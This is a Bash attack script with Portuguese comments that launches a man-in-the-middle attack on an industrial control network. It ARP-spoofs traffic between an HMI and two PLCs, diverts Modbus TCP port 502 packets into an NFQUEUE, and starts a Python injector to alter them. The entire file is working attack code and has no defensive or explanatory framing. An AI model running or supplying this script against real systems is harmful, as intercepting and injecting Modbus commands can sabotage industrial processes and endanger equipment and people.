#!/bin/bash

# === CONFIGURAÇÕES ===
IFACE="eth1"
HMI="172.27.224.10"
PLC1="172.27.224.250"
PLC2="172.27.224.251"
QUEUE_NUM=1
PYTHON_SCRIPT="./modbus_injector.py"
# =====================

# Verificar root
if [ "$EUID" -ne 0 ]; then
    echo "[ERRO] Este script tem de ser corrido como root!"
    exit 1
fi

# Ativar encaminhamento
echo 1 > /proc/sys/net/ipv4/ip_forward

# Desativar offloading (evita problemas Scapy)
ethtool -K $IFACE tx off rx off tso off gso off gro off lro off

# Regras iptables para interceptar Modbus TCP (porta 502)
iptables -I FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num $QUEUE_NUM
iptables -I FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num $QUEUE_NUM

# Função de limpeza
cleanup() {
    echo "[INFO] A limpar regras e processos..."
    pkill -P $$
    iptables -D FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num $QUEUE_NUM
    iptables -D FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num $QUEUE_NUM
    exit 0
}
trap cleanup INT

# Iniciar ARP spoof bidirecional
arpspoof -i $IFACE -t $HMI $PLC1 &
arpspoof -i $IFACE -t $PLC2 $PLC1 &
arpspoof -i $IFACE -t $PLC1 $HMI &
#arpspoof -i $IFACE -t $PLC1 $PLC2 &

# Iniciar script Python
python3 "$PYTHON_SCRIPT" &

# Esperar até CTRL+C
wait